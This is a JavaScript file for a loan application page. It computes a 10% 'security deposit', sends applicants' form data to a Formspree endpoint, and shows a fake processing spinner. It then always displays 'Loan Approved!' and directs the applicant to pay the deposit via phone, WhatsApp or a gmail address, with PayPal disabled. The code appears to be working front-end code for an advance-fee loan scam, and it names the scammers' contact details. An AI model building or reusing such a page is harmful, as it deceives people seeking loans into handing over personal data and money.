const amount = document.getElementById("amount");
const deposit = document.getElementById("deposit");

// Update security deposit in real time
amount.addEventListener("input", () => {
    let value = Number(amount.value);
    let fee = (value / 10).toFixed(2);
    deposit.textContent = "Security Deposit: $" + fee;
});

// Generate unique application ID
function generateAppID() {
    return "LP-" + Math.floor(100000 + Math.random() * 900000);
}

// Handle form submit
document.getElementById("loanForm").addEventListener("submit", function(e){
    e.preventDefault();

    // Submit form to Formspree
    fetch("https://formspree.io/f/mzdkgjwl", {
        method: "POST",
        body: new FormData(this),
        headers: {'Accept': 'application/json'}
    });

    const appID = generateAppID();
    const loanAmount = Number(amount.value).toFixed(2);
    const depositAmount = (loanAmount / 10).toFixed(2);
    const purpose = document.getElementById("purpose").value;
    const term = document.getElementById("term").value;

    // Show processing screen
    document.body.innerHTML = `
    <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:Arial;">
        <div class="spinner" style="margin-bottom:30px;"></div>
        <h2 style="color:white;">Processing Application...</h2>
        <p style="color:white;opacity:0.8;">Application ID: ${appID}</p>
    </div>
    `;

    // Add spinner CSS dynamically
    const style = document.createElement('style');
    style.innerHTML = `
    .spinner {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #0047ab;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    `;
    document.head.appendChild(style);

    // After 3 seconds → show approval + loan summary
    setTimeout(() => {
        document.body.innerHTML = `
        <div style="font-family:Arial; max-width:500px; margin:40px auto; background:white; border-radius:16px; padding:30px; box-shadow:0 15px 40px rgba(0,0,0,0.25); text-align:center;">
            <h1 style="color:green;">Loan Approved!</h1>
            <p style="font-size:14px; color:#555;">Application ID: <strong>${appID}</strong></p>
            
            <h3>Loan Summary</h3>
            <p>Loan Amount: $${loanAmount}</p>
            <p>Security Deposit: $${depositAmount}</p>
            <p>Purpose: ${purpose}</p>
            <p>Loan Term: ${term} months</p>

            <h3 style="margin-top:25px;">Next Step</h3>
            <p>Please contact support to complete payment and get your disbursement.</p>

            <button disabled style="padding:12px; margin-top:10px; background:#0047ab; color:white; border:none; border-radius:8px; cursor:not-allowed;">PayPal (Currently Unavailable)</button>

            <div style="margin-top:20px;">
                <p>📞 +1 401 203 7154</p>
                <p>💬 WhatsApp: +1 368 222 2615</p>
                <p>📧 1dschnepp@gmail.com</p>
            </div>

            <p style="margin-top:20px; font-size:12px; color:gray;">
                Our support team will guide you through the final steps to receive your funds.
            </p>
        </div>
        `;
    }, 3000);
});